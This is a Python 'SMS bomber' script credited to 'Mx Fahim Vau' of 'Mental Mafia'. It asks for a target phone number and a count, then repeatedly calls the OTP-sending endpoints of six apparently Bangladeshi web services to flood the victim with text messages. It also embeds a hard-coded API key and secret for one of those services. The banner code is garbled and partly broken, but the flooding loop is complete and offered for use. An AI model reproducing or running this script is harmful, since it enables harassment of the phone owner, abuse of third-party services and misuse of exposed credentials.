#colour

#The Tool Admin : Mx Fahim Vau

 

import requests

 

from requests.structures import CaseInsensitiveDict

 

import os

 

import sys

 

import time

 

os.system("pip install requests")

 

os.system("clear")

 

red="\033[0;31m"          # Red

 

yellow="\033[0;33m"       # Yellow

 

green="\033[0;32m"        # Green

 

color_off="\033[0m"       # Text Reset

 

bblack="\033[1;30m"       # Black

 

bred="\033[1;31m"         # Red

 

ured="\033[4;31m"         # Red

 

on_green="\033[42m"       # Green

 

lightblue = '\033[94m'

 

red = '\033[91m'

 

white = '\33[97m'

 

yellow = '\33[93m'

 

green = '\033[1;32m'

 

cyan  = "\033[96m"

 

end = '\033[0m'

 

purple="\033[0;35m"

 

on_green="\033[42m"       # Green

 

 

 

#main part

#heddar

os.system("clear")

 

logo=(blue+"""

logo = """

      \033[1;91m:  â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤ â–ˆâ–’â–’â–’â–ˆâ–ˆâ–ˆâ–’â–ˆâ–’â–ˆâ–’â–ˆâ–ˆâ–ˆâ–ˆ  â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤ :

      \033[1;92m:  â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤ â–ˆâ–’â–’â–’â–ˆâ–’â–ˆâ–’â–ˆâ–’â–ˆâ–’â–ˆâ–’â–’â–’  â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤ :

      \033[1;93m:  â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤ â–ˆâ–’â–’â–’â–ˆâ–’â–ˆâ–’â–ˆâ–’â–ˆâ–’â–ˆâ–ˆâ–ˆâ–’  â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤ :

      \033[1;94m:  â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤ â–ˆâ–’â–’â–’â–ˆâ–’â–ˆâ–’â–ˆâ–’â–ˆâ–’â–ˆâ–’â–’â–’  â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤ :

      \033[1;95m:  â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤ â–ˆâ–ˆâ–ˆâ–’â–ˆâ–ˆâ–ˆâ–’â–’â–ˆâ–’â–’â–ˆâ–ˆâ–ˆâ–ˆ  â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤ : 

      \033[1;96m:  â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤      â–‡ðŸ„µðŸ„°ðŸ„²ðŸ„´ðŸ„±ðŸ„¾ðŸ„¾ðŸ„ºâ–‡     â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤ :

      \033[1;91m:  â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤        â–‚â–‡ðŸ„ºðŸ„¸ðŸ„½ðŸ„¶â–‡â–‚     â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤ :

      \033[1;94m:  

@@@  @@                                  @@  @@@

 @@@@@@                                 @@@@@@

  @@@@@           88888888888           @@@@@

    @@@@        888888888888888        @@@@

      @@@@    8888888888888888888    @@@@

        @@@@888 88888888888888 8888@@@@

           8888  888888888888  88888@

          88888    88888888    888888

          88888      8888      888888

          888888888888888888888888888

           88888888888  888888888888

            88888888      888888888

             8888888888888888888888

              88888888888888888888

                8888888888888888

             @@@@ ||||||||||| @@@@

           @@@@   |||||||||||  @@@@

          @@@@                   @@@@ 

        @@@@@                      @@@@@

     @@ @@@        Mental Mafiya        @@@ @@

 

\033[1;95mâ—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â€¢â—ˆâ€¢â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤\033[1;96mMental Mafia\033[1;95mâ—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â€¢â—ˆâ€¢â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤

\033[1;93m                 â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤ Mental Mafia â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤

\033[1;93m                 â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤  Real King  â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤

\033[1;93m                 â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤ Mx Fahim Vauâ—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤

\033[1;95mâ—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â€¢â—ˆâ€¢â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤\033[1;96maMental Mafia\033[1;95mâ—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â€¢â—ˆâ€¢â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤â—¥â—¤"""

 

                                                                                           

 

""")

 

 

 

 

line=(green+"======================================================================")

tversion=(cyan+"\t\t   Version : 0.1 ")

 

line2=("\t\t~~~~~~~~~~~~~~~~~~~~~~~~~~")

 

dtls=(green+"\t\t Created By: Mx Fahim Vau ")

 

note=(cyan+"\n\n ============================= \n Author : Mx Fahim Vau\n =============================\n Facebook : https://www.facebook.com/tor.mare.xhudi.365.din\n=============================\n Follow Me On Facebook\n=============================\n GITHUB : https://github.com/MENTAL-MAFIYA-CYBER-KING/.\n=============================\n ")

 

 

print(logo)

 

print(" ")

 

print(dtls)

 

print(tversion)

 

 

print(note)

 

 

 

 

 

 

print(' ')

 

#bomber

 

number=str(input(red+"[âž™] Enter Terget Number : "))

amount=int(input(cyan+"[âž™] Enter The Amount : "))

 

url1 = "https://ss.binge.buzz/otp/send/login"

 

headers1 = CaseInsensitiveDict()

headers1["Content-Type"] = "application/x-www-form-urlencoded"

 

data1 = "phone="+number

 

 

 

url2 = "https://api.daktarbhai.com/api/v2/otp/generate?=&api_key=BUFWICFGGNILMSLIYUVH&api_secret=WZENOMMJPOKHYOMJSPOGZNAGMPAEZDMLNVXGMTVE&mobile=%2B88"+number+"&platform=app&activity=login"

 

headers2 = CaseInsensitiveDict()

headers2["Content-Type"] = "application/json"

headers2["Content-Length"] = "0"

 

 

url3 = "https://stage.bioscopelive.com/en/login/send-otp?phone=88"+number+"&operator=bd-otp"

 

url4 = "https://xrides.shohoz.com/api/v2/user/send-mobile-verification-code"

 

headers4 = CaseInsensitiveDict()

headers4["Content-Type"] = "application/json"

 

data4 = '{\"mobile\":\"'+number+'\"}'

 

url5 = "https://addabaji.mobi/twocups-v1-robi/otp.php"

 

headers5 = CaseInsensitiveDict()

headers5["Content-Type"] = "application/x-www-form-urlencoded"

 

data5 = "msisdn="+number

 

url6 = "https://developer.quizgiri.xyz/api/v2.0/send-otp"

headers6 = CaseInsensitiveDict()

headers6["Content-Type"] = "application/json"

 

data6 = '{"phone":"'+number+'","country_code":"+880","fcm_token":null}'

 

for i in range (amount):

        resp1 = requests.post(url1, headers=headers1, data=data1)

        resp2 = requests.post(url2, headers=headers2)

        resp3 = requests.get(url3)

        resp4 = requests.post(url4, headers=headers4,data=data4)

        resp5 = requests.post(url5, headers=headers5, data=data5)

        resp6 = requests.post(url6, headers=headers6, data=data6)

        print(str(i+1)+green+'. âž™ successfully SMS Sent ðŸš€ âœ…ðŸ‡§ðŸ‡©')

 

 
